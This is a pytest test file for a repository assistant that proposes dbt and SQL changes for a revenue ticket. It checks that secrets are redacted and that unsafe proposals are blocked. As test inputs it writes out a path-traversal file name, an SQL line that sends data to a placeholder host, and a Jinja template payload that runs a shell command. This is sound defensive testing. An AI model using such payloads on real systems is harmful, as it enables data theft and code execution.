from pathlib import Path
import shutil
import pytest

from delivery_assistant.models import FileChange, Ticket
from delivery_assistant.repository import ALLOWED_CHANGE_PATHS, RepoTools

ROOT = Path(__file__).resolve().parents[1]


@pytest.fixture
def tools():
    return RepoTools(ROOT / "sample_repo")


@pytest.fixture
def ticket():
    return Ticket(request_id="REQ-001",title="Exclude canceled revenue",summary="Exclude canceled orders from revenue.",metric="revenue",excluded_statuses=["canceled"],acceptance_criteria=["Daily totals exclude canceled orders."],clarification_questions=[],supported=True)


def test_retrieval_finds_downstream_assets_and_does_not_read_env(tools, tmp_path):
    evidence=tools.retrieve("revenue canceled orders")
    assert set(ALLOWED_CHANGE_PATHS).issubset({item.path for item in evidence})
    assert all(item.path != ".env" for item in evidence)


def test_retrieval_excludes_secret_files_and_redacts_sensitive_lines(tmp_path):
    repository=tmp_path/"repo"
    shutil.copytree(ROOT/"sample_repo",repository)
    marker="FAKE_SECRET_RETRIEVAL_SENTINEL"
    (repository/".env").write_text("OPENAI_API_KEY="+marker,encoding="utf-8")
    with (repository/"docs/revenue.md").open("a",encoding="utf-8") as stream:
        stream.write("\napi_key="+marker+"\n")
    evidence=RepoTools(repository).retrieve("revenue api_key",limit=10)
    assert marker not in "\n".join(item.content for item in evidence)
    assert "[REDACTED sensitive line]" in "\n".join(item.content for item in evidence)
    assert all(item.path!=".env" for item in evidence)


def test_traversal_patch_is_blocked_before_workspace_creation(tools,ticket,tmp_path):
    proposal=tools.sample_proposal(ticket,tools.retrieve("revenue"))
    proposal.changes[0].path="../outside.sql"
    report=tools.validate(ticket,proposal.changes,tmp_path/"run")
    assert not report.passed
    assert not (tmp_path/"run/workspace").exists()


def test_arbitrary_sql_is_blocked_before_execution(tools,ticket,tmp_path):
    proposal=tools.sample_proposal(ticket,tools.retrieve("revenue"))
    proposal.changes[0].content="SELECT * FROM read_csv_auto('https://example.invalid/leak')"
    report=tools.validate(ticket,proposal.changes,tmp_path/"run")
    assert not report.passed
    assert report.executed_commands==[]


def test_jinja_execution_is_blocked(tools,ticket,tmp_path):
    proposal=tools.sample_proposal(ticket,tools.retrieve("revenue"))
    proposal.changes[1].content="{{ modules.os.system('echo unsafe') }}"
    report=tools.validate(ticket,proposal.changes,tmp_path/"run")
    assert not report.passed
    assert report.executed_commands==[]


def test_dashboard_policy_drift_is_blocked(tools,ticket,tmp_path):
    proposal=tools.sample_proposal(ticket,tools.retrieve("revenue"))
    proposal.changes[3].content=proposal.changes[3].content.replace("- canceled", "- completed")
    report=tools.validate(ticket,proposal.changes,tmp_path/"run")
    assert not report.passed
    assert report.executed_commands==[]


def test_unclarified_ticket_cannot_validate(tools,ticket,tmp_path):
    ticket.clarification_questions=["Which order statuses should be excluded?"]
    proposal=tools.sample_proposal(ticket,tools.retrieve("revenue"))
    report=tools.validate(ticket,proposal.changes,tmp_path/"run")
    assert not report.passed
    assert report.executed_commands==[]


def test_real_dbt_and_acceptance_checks_preserve_source(tools,ticket,tmp_path):
    source_hash=tools.snapshot_hash()
    proposal=tools.sample_proposal(ticket,tools.retrieve("revenue canceled"))
    report=tools.validate(ticket,proposal.changes,tmp_path/"run")
    assert report.passed, report.model_dump_json(indent=2)
    assert report.baseline_total==920
    assert report.proposed_total==770
    assert report.expected_total==770
    assert tools.snapshot_hash()==source_hash
    assert len(report.executed_commands)==2
